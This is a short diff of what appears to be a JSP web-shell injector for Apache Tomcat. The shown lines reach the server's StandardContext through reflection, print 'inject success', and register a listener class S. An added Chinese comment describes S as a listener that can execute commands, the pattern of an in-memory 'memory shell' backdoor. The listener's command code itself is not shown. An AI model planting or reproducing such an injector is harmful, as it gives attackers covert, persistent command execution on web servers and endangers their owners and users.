@@ -39,5 +39,6 @@ stdctx.setAccessible(true);
 StandardContext standardContext = (StandardContext) stdctx.get(applicationContext);
 out.println("inject success");
 S servletRequestListener = new S();
+//创建能够执行命令的Listener
 standardContext.addApplicationEventListener(servletRequestListener);
 %>
